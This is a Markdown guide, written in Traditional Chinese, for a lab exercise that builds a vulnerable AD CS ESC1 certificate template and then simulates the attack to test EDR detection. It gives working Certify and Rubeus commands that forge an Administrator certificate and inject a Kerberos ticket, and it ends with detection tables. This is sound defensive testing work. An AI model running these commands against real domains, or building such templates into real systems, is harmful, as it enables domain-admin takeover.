@@ -1,0 +1,102 @@
+# AD CS ESC1 Vulnerability Validation Guide
+
+本文件旨在提供完整的 ESC1 (AD CS Certificate Abuse) 漏洞環境建置與驗證流程，用於測試 EDR 系統的偵測與防禦能力。
+
+## 環境資訊
+
+*   **AD CS 主機 (CA Server)**: `10.0.0.206` (SME-SWP-W-AD)
+*   **CA 名稱**: `sme-SME-SWP-W-AD-CA`
+*   **攻擊測試機**: `10.0.0.x` (已安裝 Certify 與 Rubeus)
+*   **目標**: 驗證 EDR 是否能偵測異常憑證申請與後續的身分偽冒行為。
+
+---
+
+## 第一階段：漏洞環境建置 (AD CS 主機端)
+
+此階段在 AD CS 主機上建立一個具有 ESC1 漏洞特徵的憑證範本。
+
+### 步驟 1：建立 ESC1 範本
+1.  執行 `certtmpl.msc` 開啟範本管理主控台。
+2.  複製 `User` 範本 (相容性選 Windows Server 2003)。
+3.  設定以下關鍵屬性：
+    *   **Template Name**: `ESC1`
+    *   **Request Handling**: 勾選 `Allow private key to be exported`。
+    *   **Subject Name**: 選擇 `Supply in the request` (⚠️ 核心漏洞點)。
+    *   **Extensions**: 確認 `Application Policies` 包含 `Client Authentication`。
+    *   **Security**: 加入 `Domain Users` 並勾選 `Read` 與 `Enroll`。
+    *   **Issuance Requirements**: 確認 `Manager approval` **未勾選**。
+
+### 步驟 2：發佈範本
+1.  執行 `certsrv.msc` 開啟 CA 管理主控台。
+2.  右鍵點擊 `Certificate Templates` -> `New` -> `Certificate Template to Issue`。
+3.  選擇 `ESC1` 範本並發佈。
+
+---
+
+## 第二階段：攻擊模擬 (測試機端)
+
+此階段模擬攻擊者利用 ESC1 漏洞獲取 Domain Admin 權限。
+
+### 步驟 1：漏洞偵察 (Enumeration)
+使用 Certify 掃描環境中是否存在易受攻擊的範本。
+
+```powershell
+& ".\Certify.exe" enum-templates /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /vulnerable
+```
+
+**預期結果**: 發現 `ESC1` 範本，且標記 `[!] Vulnerable to ESC1: True`。
+
+### 步驟 2：漏洞利用 - 申請惡意憑證 (Exploitation)
+利用 `ESC1` 範本，偽造 `Administrator` 身分申請憑證。
+
+```powershell
+& ".\Certify.exe" request /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /template:ESC1 /upn:Administrator@sme.local /out-file:admin.pem
+```
+
+**預期結果**: 成功取得 `admin.pem`，內容包含私鑰與憑證。
+
+### 步驟 3：權限提升 - PKINIT 認證 (Privilege Escalation)
+將 PEM 憑證轉換為 TGT (Ticket Granting Ticket)，直接注入記憶體。
+
+```powershell
+# 讀取 PEM 內容並移除換行 (直接使用 Base64 字串，不需轉檔)
+$pem = (Get-Content ".\admin.pem" -Raw).Replace("`r`n","").Replace("`n","")
+
+# 使用 Rubeus 進行 PKINIT
+.\Rubeus.exe asktgt /user:Administrator /certificate:$pem /domain:sme.local /dc:10.0.0.206 /ptt
+```
+
+**預期結果**: 顯示 `[+] Ticket successfully imported!`，並可存取 DC (e.g., `dir \\10.0.0.206\c$`)。
+
+---
+
+## 第三階段：EDR 與日誌驗證 (The Validation)
+
+EDR 或 SIEM 系統應能偵測以下異常行為與事件日誌。
+
+### Windows Event Logs (重點監控)
+
+| Event ID | 來源 | 說明 | 偵測重點 (IOC) |
+| :--- | :--- | :--- | :--- |
+| **4886** | Security (CA) | 憑證服務收到憑證申請 | 檢查 `Attributes` 欄位是否包含 `SAN:upn=Administrator@sme.local`，但申請者帳號卻是低權限使用者。 |
+| **4887** | Security (CA) | 憑證服務已發行憑證 | 同上，確認異常 SAN 憑證已被簽發。 |
+| **4768** | Security (DC) | Kerberos TGT 請求 (PKINIT) | 檢查 `Certificate Information`。攻擊者使用憑證進行認證時觸發。若短時間內頻繁申請 TGT 屬異常。 |
+| **4624** | Security (DC) | 帳戶成功登入 | 登入類型為 `3` (Network) 或 `9` (NewCredentials)，且使用 Administrator 身分。 |
+
+### Endpoint Telemetry (EDR 視角)
+
+| 行為 | 說明 | 偵測重點 |
+| :--- | :--- | :--- |
+| **Process Execution** | 執行攻擊工具 | `Certify.exe` 或 `Rubeus.exe` 的執行。攻擊者可能改名，需依賴行為特徵。 |
+| **Command Line** | 參數特徵 | 包含 `/ca:`, `/template:`, `/altname:`, `/ptt`, `asktgt` 等關鍵字。 |
+| **.NET Assembly Load** | 記憶體載入 | 監控 `ETW` (Event Tracing for Windows) Provider `Microsoft-Windows-DotNETRuntime`。 |
+| **ETW 151/154** | Assembly 載入事件 | 偵測非受信任的 Assembly 載入，或來自記憶體的反射載入 (Reflective DLL Injection)。 |
+| **Network Connection** | 網路連線 | 測試機對 CA (TCP 135, 445, 80/443) 與 DC (TCP 88, 389) 的異常連線。 |
+
+---
+
+## 結論
+
+若 EDR 系統能有效運作，應在 **步驟 2 (申請憑證)** 時即發出告警 (偵測到異常 SAN 申請)，或在 **步驟 3 (PKINIT)** 時攔截 (偵測到已知攻擊工具行為或異常 TGT 請求)。
+
+此環境已驗證 ESC1 攻擊路徑的可行性，可用於持續測試 EDR 規則的有效性。
